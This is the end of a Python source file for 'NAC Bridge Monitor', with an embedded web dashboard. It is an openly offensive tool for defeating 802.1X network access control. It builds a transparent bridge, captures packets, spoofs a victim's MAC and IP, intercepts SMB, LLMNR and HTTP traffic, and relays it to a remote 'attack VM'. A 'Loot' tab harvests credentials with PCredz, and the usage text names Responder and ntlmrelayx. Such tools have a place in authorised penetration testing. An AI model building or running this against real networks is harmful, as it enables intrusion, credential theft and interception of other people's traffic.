.interface-detail{display:flex;justify-content:space-between;padding:6px 0;font-size:.9em;border-bottom:1px solid #f0f0f0}
.button-group{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.btn{flex:1;min-width:180px;padding:15px 30px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:all .3s;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-start{background:#28a745}
.btn-start:hover:not(:disabled){background:#218838}
.btn-stop{background:#dc3545}
.btn-stop:hover:not(:disabled){background:#c82333}
.btn-refresh{background:#667eea}
.btn-refresh:hover:not(:disabled){background:#5568d3}
.btn-download{background:#17a2b8}
.btn-download:hover:not(:disabled){background:#138496}
.btn-danger{background:#dc3545}
.btn-danger:hover:not(:disabled){background:#c82333}
.info-box{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:15px 0;border-radius:5px}
.info-box h4{color:#856404;margin-bottom:8px}
.info-box p{color:#856404;font-size:.9em;margin:5px 0}
input[type="text"]{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:15px}
input[type="text"]:focus{outline:none;border-color:#667eea}
.rule-item{background:#f8f9fa;border-left:4px solid #28a745;padding:15px;margin:10px 0;border-radius:8px;display:flex;justify-content:space-between;align-items:center}
.rule-info{font-family:monospace;font-size:.9em}
.alert{padding:15px;border-radius:8px;margin-bottom:20px;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724}
.alert-error{background:#f8d7da;color:#721c24}
.alert-info{background:#d1ecf1;color:#0c5460}
.capture-info{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border-radius:10px;padding:25px;margin-bottom:20px;display:none}
.capture-info.active{display:block}
.capture-detail{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.2)}
.logs-section{background:#1e1e1e;color:#0f0;border-radius:8px;padding:20px;margin-top:20px;font-family:monospace;font-size:.85em;max-height:300px;overflow-y:auto}
.loot-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
.stat-card{background:#f8f9fa;border-radius:10px;padding:20px;text-align:center;border-left:4px solid #dc3545}
.stat-value{font-size:2.5em;font-weight:700;color:#333;margin-bottom:5px}
.stat-label{font-size:.9em;color:#666;text-transform:uppercase}
.loot-filters{display:flex;gap:10px;flex-wrap:wrap;margin:20px 0}
.filter-btn{padding:8px 16px;border:2px solid #e0e0e0;background:#fff;border-radius:20px;cursor:pointer;font-weight:600;color:#666;transition:all .3s}
.filter-btn:hover{border-color:#667eea;color:#667eea}
.filter-btn.active{background:#667eea;color:#fff;border-color:#667eea}
.loot-items{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-height:500px;overflow-y:auto}
.loot-item{background:#fff;border:1px solid #e0e0e0;border-left:4px solid #dc3545;border-radius:8px;padding:15px;transition:all .3s}
.loot-item:hover{box-shadow:0 4px 12px rgba(0,0,0,.1);transform:translateX(5px)}
.loot-item.http{border-left-color:#28a745}
.loot-item.ftp{border-left-color:#17a2b8}
.loot-item.smtp{border-left-color:#ffc107}
.loot-item.ntlm{border-left-color:#dc3545}
.loot-item.imap{border-left-color:#6f42c1}
.loot-header{display:flex;justify-content:space-between;margin-bottom:10px}
.loot-protocol{font-weight:700;color:#667eea;font-size:1.1em}
.loot-timestamp{font-size:.85em;color:#999}
.loot-content{font-family:monospace;font-size:.9em;background:#f8f9fa;padding:10px;border-radius:5px;margin-top:10px}
.loot-field{padding:5px 0}
.loot-field strong{color:#333}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-state-icon{font-size:4em;margin-bottom:20px;opacity:.5}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>NAC Bridge Monitor</h1>
<p>Transparent Bridge + MITM Interception</p>
</div>
<div class="dashboard">
<div class="info-banner">
<h3>[i] Transparent Mode Active</h3>
<p>Bridge operates at Layer 2 only. Client 802.1X authentication passes through transparently. No stealth mode - bridge is always active for seamless operation.</p>
</div>
<div id="alert" class="alert"></div>
<div class="tab-nav">
<button class="tab-btn active" onclick="switchTab('status')">Status</button>
<button class="tab-btn" onclick="switchTab('mitm')">MITM</button>
<button class="tab-btn" onclick="switchTab('loot')">Loot <span id="lootBadge" class="badge">0</span></button>
</div>
<div id="statusTab" class="tab-content active">
<div class="status-header">
<h2>Capture Status</h2>
<div id="statusBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>
<div class="grid">
<div class="card">
<div class="card-title">Capture Size</div>
<div class="card-value" id="captureSize">0 MB</div>
<div class="card-detail" id="capturePackets">0 packets</div>
</div>
<div class="card">
<div class="card-title">Duration</div>
<div class="card-value" id="captureDuration">00:00:00</div>
<div class="card-detail">Elapsed time</div>
</div>
</div>
<div id="captureInfo" class="capture-info">
<h3>Active Capture</h3>
<div class="capture-detail">
<span>File:</span>
<span id="captureFile" style="font-family:monospace">-</span>
</div>
<div class="capture-detail">
<span>Bridge:</span>
<span id="bridgeName">br0</span>
</div>
<div class="capture-detail">
<span>PID:</span>
<span id="capturePid">-</span>
</div>
</div>
<h2 style="margin-bottom:15px;color:#667eea">Network Topology</h2>
<div id="interfaces" class="interface-grid"></div>
<div class="button-group">
<button id="btnStart" class="btn btn-start">Start Capture</button>
<button id="btnStop" class="btn btn-stop" disabled>Stop Capture</button>
<button id="btnPcapSize" class="btn btn-refresh" disabled>PCAP Size: 0 MB</button>
<button id="btnDownload" class="btn btn-download" disabled>Download PCAP</button>
<button id="btnDelete" class="btn btn-danger" disabled>Delete PCAP</button>
<button class="btn btn-refresh" onclick="fetchStatus()">Refresh</button>
</div>
<div class="logs-section">
<h3 style="color:#fff;margin-bottom:10px">Recent Logs</h3>
<div id="logs"></div>
</div>
</div>

<!-- MITM TAB -->
<div id="mitmTab" class="tab-content">
<div class="status-header">
<h2>MITM Control</h2>
<div id="mitmBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<div class="info-box">
<h4>WARNING: MITM Mode</h4>
<p>Enables active traffic interception. Bridge learns victim MAC/IP and spoofs all attacker traffic.</p>
<p><strong>Warning:</strong> This makes the device detectable. Use carefully.</p>
</div>

<div id="victimInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
<h3 style="color:#0066cc;margin-bottom:15px">Target Device</h3>
<p style="margin:8px 0"><strong>MAC:</strong> <code id="victimMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>IP:</strong> <code id="victimIP" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Gateway MAC:</strong> <code id="gatewayMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Bridge IP:</strong> <code id="bridgeIP" style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
</div>

<h3 style="margin:20px 0 15px 0">Remote Attacker (Optional)</h3>
<p style="margin-bottom:15px;color:#666">Route intercepted traffic to external attack VM over WiFi (e.g., Kali at 172.31.250.100)</p>
<input type="text" id="remoteIP" placeholder="Remote VM IP (e.g., 172.31.250.100)">

<div class="button-group">
<button id="btnEnableMITM" class="btn btn-danger" onclick="enableMITM()">Enable MITM</button>
<button id="btnDisableMITM" class="btn btn-stop" onclick="disableMITM()" disabled>Disable MITM</button>
</div>

<h3 style="margin:25px 0 15px 0">Protocol Interception</h3>
<p style="margin-bottom:15px;color:#666">Intercept specific protocols and redirect to bridge IP or remote attacker</p>

<div class="grid" style="margin-bottom:20px">
<div class="card" style="border-left-color:#dc3545;cursor:pointer" onclick="interceptCategory('smb')">
<div class="card-title">SMB/NetBIOS</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Ports 137,138,139,445</div>
<div style="margin-top:10px;font-size:.85em;color:#dc3545;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#ffc107;cursor:pointer" onclick="interceptCategory('name_resolution')">
<div class="card-title">Name Resolution</div>
<div style="font-size:.9em;color:#666;margin-top:8px">LLMNR, mDNS</div>
<div style="margin-top:10px;font-size:.85em;color:#ffc107;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#17a2b8;cursor:pointer" onclick="interceptCategory('http')">
<div class="card-title">HTTP</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Port 80</div>
<div style="margin-top:10px;font-size:.85em;color:#17a2b8;font-weight:600">Click to Intercept</div>
</div>
</div>

<h3 style="margin:20px 0 15px 0">Active Intercept Rules</h3>
<div id="activeRules"></div>
<button class="btn btn-danger" onclick="clearRules()" style="margin-top:15px">Clear All Rules</button>
</div>


<div id="lootTab" class="tab-content">
<h2 style="margin-bottom:20px;color:#667eea">PCredz Analysis Output</h2>
<div class="button-group" style="margin-bottom:20px">
<button onclick="analyzeNow()" id="btnAnalyze" class="btn btn-start">Analyze PCAP Now</button>
<button onclick="exportLoot()" class="btn btn-download">Export Output (TXT)</button>
<button onclick="clearLoot()" class="btn btn-danger">Clear Output</button>
</div>
<div id="lootOutput" class="logs-section" style="max-height:600px;white-space:pre-wrap;word-wrap:break-word">
<div style="color:#999;text-align:center;padding:40px">
<div style="font-size:3em;margin-bottom:15px">[ ]</div>
<p>No PCredz output yet</p>
<p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p>
</div>
</div>
</div>
</div>
</div>
<script>
// Error boundary - catch all errors
window.addEventListener('error', function(e) {
    console.error('Global error:', e.message, 'at', e.filename, 'line', e.lineno);
    alert('JavaScript Error: ' + e.message + ' at line ' + e.lineno);
});

console.log('Script starting...');

let startTime=null,currentFilter='all',allLoot=[];
function showAlert(message,type="info"){
    try{
        const el=document.getElementById("alert");
        if(!el){console.error('Alert element not found');return}
        el.className="alert alert-"+type+" show";
        el.textContent=message;
        setTimeout(function(){el.classList.remove("show")},5000);
    }catch(err){
        console.error('showAlert error:',err);
        alert(message);
    }
}
function formatBytes(bytes){if(bytes===0)return"0 B";const k=1024,sizes=["B","KB","MB","GB"];const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}
function formatDuration(seconds){const h=Math.floor(seconds/3600);const m=Math.floor(seconds%3600/60);const s=Math.floor(seconds%60);return h.toString().padStart(2,"0")+":"+m.toString().padStart(2,"0")+":"+s.toString().padStart(2,"0")}
function switchTab(tab){
    try{
        console.log('Switching to tab:', tab);
        document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));
        document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));
        const tabEl=document.getElementById(tab+"Tab");
        if(tabEl)tabEl.classList.add("active");
        if(window.event&&window.event.target)window.event.target.classList.add("active");
        if(tab==="loot")fetchLoot();
        if(tab==="mitm")fetchStatus();
    }catch(err){
        console.error('switchTab error:',err);
        alert('Tab switch error: '+err.message);
    }
}
function updateStatus(data){
try{
const isActive=data.status==="active";
const badge=document.getElementById("statusBadge");
if(badge){
badge.className="status-badge "+(isActive?"active":"inactive");
badge.innerHTML='<span class="status-indicator '+(isActive?"active":"inactive")+'"></span><span>'+(isActive?"Active":"Inactive")+'</span>';
}
const captureInfo=document.getElementById("captureInfo");
if(captureInfo){
captureInfo.className="capture-info "+(isActive?"active":"");
}
const size=data.pcap_size||0;
const packets=data.packet_count||0;
const pcapSizeBtn=document.getElementById("btnPcapSize");
if(pcapSizeBtn){
pcapSizeBtn.textContent="PCAP Size: "+formatBytes(size);
pcapSizeBtn.disabled=!data.pcap_file;
}
if(data.mitm){
const mitmBadge=document.getElementById("mitmBadge");
if(mitmBadge){
const enabled=data.mitm.enabled;
mitmBadge.className="status-badge "+(enabled?"active":"inactive");
mitmBadge.innerHTML='<span class="status-indicator '+(enabled?"active":"inactive")+'"></span><span>'+(enabled?"Active":"Inactive")+'</span>';
}
const btnEnableMITM=document.getElementById("btnEnableMITM");
if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;
const btnDisableMITM=document.getElementById("btnDisableMITM");
if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;
if(data.mitm.victim_mac){
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="block";
const victimMac=document.getElementById("victimMac");
if(victimMac)victimMac.textContent=data.mitm.victim_mac;
const victimIP=document.getElementById("victimIP");
if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";
const gatewayMac=document.getElementById("gatewayMac");
if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown";
}else{
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="none";
}
const rulesDiv=document.getElementById("activeRules");
if(rulesDiv){
if(data.mitm.active_rules&&data.mitm.active_rules.length>0){
var rulesHTML='';
for(var i=0;i<data.mitm.active_rules.length;i++){
var rule=data.mitm.active_rules[i];
rulesHTML+='<div class="rule-item"><div class="rule-info"><strong>'+rule.protocol+'</strong> port '+rule.port+' to '+rule.target_ip+' ('+rule.destination+')</div></div>';
}
rulesDiv.innerHTML=rulesHTML;
}else{
rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>';
}
}
}
if(isActive){
const captureFile=document.getElementById("captureFile");
if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";
const capturePid=document.getElementById("capturePid");
if(capturePid)capturePid.textContent=data.pid||"-";
const bridgeName=document.getElementById("bridgeName");
if(bridgeName)bridgeName.textContent=data.bridge||"br0";
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=formatBytes(size);
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";
if(data.start_time){
if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}
const elapsed=Math.floor((new Date()-startTime)/1000);
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent=formatDuration(elapsed);
}
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=true;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=false;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=true;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=false;
}else{
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=false;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=true;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=!data.pcap_file;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=!data.pcap_file;
startTime=null;
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent="0 packets";
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent="00:00:00";
}
if(data.interfaces){
const container=document.getElementById("interfaces");
if(container){
var intfHTML='';
for(var i=0;i<data.interfaces.length;i++){
var intf=data.interfaces[i];
intfHTML+='<div class="interface-card">';
intfHTML+='<div class="interface-header">';
intfHTML+='<span class="interface-name">'+intf.name+'</span>';
intfHTML+='<span class="interface-status '+(intf.state==="UP"?"up":"down")+'">'+intf.state+'</span>';
intfHTML+='</div>';
intfHTML+='<div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">'+(intf.mac||"N/A")+'</span></div>';
intfHTML+='<div class="interface-detail"><span>Role:</span><span>'+(intf.role||"N/A")+'</span></div>';
intfHTML+='</div>';
}
container.innerHTML=intfHTML;
}
}
if(data.logs&&data.logs.length>0){
const logEl=document.getElementById("logs");
if(logEl){
var logHTML='';
for(var i=0;i<data.logs.length;i++){
logHTML+='<div style="padding:2px 0">'+data.logs[i]+'</div>';
}
logEl.innerHTML=logHTML;
logEl.scrollTop=logEl.scrollHeight;
}
}
}catch(err){
console.error("Error updating status:",err);
}
}
async function analyzeNow(){const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{const res=await fetch("/api/analyze",{method:"POST"});const data=await res.json();if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
async function deletePCAP(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{const res=await fetch("/api/delete_pcap",{method:"POST"});const data=await res.json();if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function fetchStatus(){try{const res=await fetch("/api/status");const data=await res.json();updateStatus(data)}catch(err){console.error("Failed to fetch status:",err);setTimeout(fetchStatus,5000)}}
async function fetchLoot(){try{const res=await fetch("/api/loot");const data=await res.json();const outputEl=document.getElementById("lootOutput");if(outputEl){if(data.has_output&&data.raw_output){outputEl.innerHTML='<pre style="margin:0;color:#0f0;font-family:monospace;font-size:.9em">'+escapeHtml(data.raw_output)+'</pre>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="OK"}else{outputEl.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No PCredz output yet</p><p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p></div>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="0"}}}catch(err){console.error("Failed to fetch loot:",err)}}
function escapeHtml(text){const div=document.createElement('div');div.textContent=text;return div.innerHTML}
async function exportLoot(){try{const res=await fetch("/api/loot");const data=await res.json();if(data.has_output){window.location.href="/api/loot/export"}else{showAlert("No output to export yet","info")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearLoot(){if(confirm("Clear all captured credentials?")){try{const res=await fetch("/api/loot/clear",{method:"POST"});const data=await res.json();if(data.success){showAlert("Loot cleared","success");fetchLoot()}else{showAlert("Failed to clear loot","error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function startCapture(){document.getElementById("btnStart").disabled=true;showAlert("Starting packet capture...","info");try{const res=await fetch("/api/start",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture started!","success");setTimeout(fetchStatus,2000);setTimeout(fetchLoot,3000)}else{showAlert("Failed to start. Check logs.","error");document.getElementById("btnStart").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStart").disabled=false}}
async function stopCapture(){if(confirm("Stop capture? Bridge will remain active.")){document.getElementById("btnStop").disabled=true;showAlert("Stopping capture...","info");try{const res=await fetch("/api/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture stopped!","success")}else{showAlert("Failed to stop","error")}setTimeout(fetchStatus,3000);setTimeout(fetchLoot,4000)}catch(err){showAlert("Error: "+err.message,"error")}}}
async function downloadPCAP(){try{const res=await fetch("/api/status");const data=await res.json();if(data.pcap_file){window.location.href="/api/download?file="+encodeURIComponent(data.pcap_file)}else{showAlert("No file","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function enableMITM(){const remoteIP=document.getElementById("remoteIP").value.trim();const msg=remoteIP?"Enable MITM and route to "+remoteIP+"?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Route intercepted traffic to remote VM":"Enable MITM (local mode)?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Intercept traffic locally";if(!confirm(msg))return;const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=true;showAlert("Enabling MITM... Learning victim (30s)","info");try{const body=remoteIP?JSON.stringify({remote_ip:remoteIP}):'{}';const res=await fetch("/api/mitm/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:body});const data=await res.json();if(data.success){showAlert("MITM enabled! Victim identified.","success");setTimeout(fetchStatus,1000)}else{showAlert("MITM failed: "+(data.error||"Unknown error"),"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}catch(err){showAlert("Error: "+err.message,"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}
async function disableMITM(){if(!confirm("Disable MITM and cleanup all rules?"))return;showAlert("Disabling MITM...","info");try{const res=await fetch("/api/mitm/disable",{method:"POST"});const data=await res.json();if(data.success){showAlert("MITM disabled","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
async function interceptCategory(category){const destination=document.getElementById("remoteIP").value.trim()?'remote':'local';const target=destination==='remote'?document.getElementById("remoteIP").value:'bridge IP';if(!confirm("Intercept "+category+" traffic?\n\nDestination: "+target))return;showAlert("Adding "+category+" intercept rules...","info");try{const res=await fetch("/api/mitm/intercept",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({category:category,destination:destination})});const data=await res.json();if(data.success){showAlert(category+" interception enabled ("+data.rules_added+" rules)","success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to add rules","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearRules(){if(!confirm("Remove all intercept rules?"))return;try{const res=await fetch("/api/mitm/clear_rules",{method:"POST"});if(res.ok){showAlert("Rules cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}

// Wait for DOM to be fully loaded before attaching event listeners
console.log('Setting up DOMContentLoaded handler');
document.addEventListener('DOMContentLoaded',function(){
try{
console.log('DOM Content Loaded - attaching event listeners');
const btnStart=document.getElementById("btnStart");
const btnStop=document.getElementById("btnStop");
const btnDownload=document.getElementById("btnDownload");
const btnDelete=document.getElementById("btnDelete");

console.log('Buttons found:', {start:!!btnStart, stop:!!btnStop, download:!!btnDownload, delete:!!btnDelete});

if(btnStart){
btnStart.addEventListener("click",startCapture);
console.log('Start button listener attached');
}
if(btnStop){
btnStop.addEventListener("click",stopCapture);
console.log('Stop button listener attached');
}
if(btnDownload){
btnDownload.addEventListener("click",downloadPCAP);
console.log('Download button listener attached');
}
if(btnDelete){
btnDelete.addEventListener("click",deletePCAP);
console.log('Delete button listener attached');
}

console.log('Fetching initial status...');
fetchStatus();
setInterval(fetchStatus,3000);
console.log('Setup complete!');
}catch(err){
console.error('DOMContentLoaded error:',err);
alert('Initialization error: '+err.message);
}
});
console.log('Script loaded, waiting for DOM...');
</script>
</body>
</html>'''

# ============================================================================
# MAIN
# ============================================================================

def main():
    global shutdown_in_progress

    print("""
╔═══════════════════════════════════════════════════════════╗
║       NAC Bridge Monitor - MITM Edition                   ║
║       Transparent Bridge + Active Interception            ║
╚═══════════════════════════════════════════════════════════╝
""")

    if os.geteuid() != 0:
        print("❌ Must run as root: sudo python3 nac-tap.py")
        return 1

    # Check dependencies
    missing = []
    for tool in ['tcpdump', 'ip', 'bridge', 'ethtool', 'iptables', 'ebtables']:
        result = run_cmd(['which', tool])
        if not result or result.returncode != 0:
            missing.append(tool)

    if missing:
        print(f"❌ Missing tools: {', '.join(missing)}")
        print(f"   Install: sudo apt install {' '.join(missing)}")
        return 1

    if not os.path.exists(CONFIG['PCREDZ_PATH']):
        print("⚠️  PCredz not found - credential harvesting disabled")
        print("   Install: sudo bash install-nac-monitor.sh")
        print()

    os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

    bridge_manager = BridgeManager()
    NACWebHandler.bridge_manager = bridge_manager

    log("NAC Bridge Monitor starting...")

    # Setup bridge at startup
    if CONFIG['TRANSPARENT_MODE']:
        log("Setting up transparent bridge...")
        if not bridge_manager.setup_transparent_bridge():
            log("Failed to setup bridge", 'WARNING')

    # Signal handlers
    def signal_handler(signum, frame):
        global shutdown_in_progress
        if shutdown_in_progress:
            return
        shutdown_in_progress = True

        log("Shutdown signal received...")
        with capture_lock:
            if bridge_manager.tcpdump_process:
                bridge_manager.stop_capture()
            if bridge_manager.mitm_manager.enabled:
                bridge_manager.mitm_manager.cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start web server
    server_address = ('', CONFIG['WEB_PORT'])
    httpd = HTTPServer(server_address, NACWebHandler)

    print(f"""
✅ Server started!

Web Interface:
  http://localhost:{CONFIG['WEB_PORT']}
  http://<device-ip>:{CONFIG['WEB_PORT']}

Architecture:
  Client ↔ [eth0 ↔ br0 ↔ eth1] ↔ Switch
               └── tcpdump + MITM interception

Features:
  🔐 Transparent Mode: Bridge always active (802.1X compatible)
  🎭 MITM Mode: Learn victim, spoof identity, intercept protocols
  📡 Remote Relay: Send intercepted traffic to external attack VM
  🎣 Credential Analysis: PCredz integration

MITM Usage:
  1. Start capture (Status tab)
  2. Enable MITM (MITM tab) - will learn victim MAC/IP
  3. Add intercept rules for protocols you want
  4. Run Responder/ntlmrelayx on bridge IP (10.200.66.1)
  5. Or set Remote IP and route to external Kali VM

Captures: {CONFIG['PCAP_DIR']}
Logs:     {CONFIG['LOGFILE']}

Press Ctrl+C to stop
""")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        if not shutdown_in_progress:
            log("Shutting down...")
            with capture_lock:
                bridge_manager.stop_capture()
                if bridge_manager.mitm_manager.enabled:
                    bridge_manager.mitm_manager.cleanup()
        httpd.shutdown()
        return 0

if __name__ == '__main__':
    sys.exit(main())
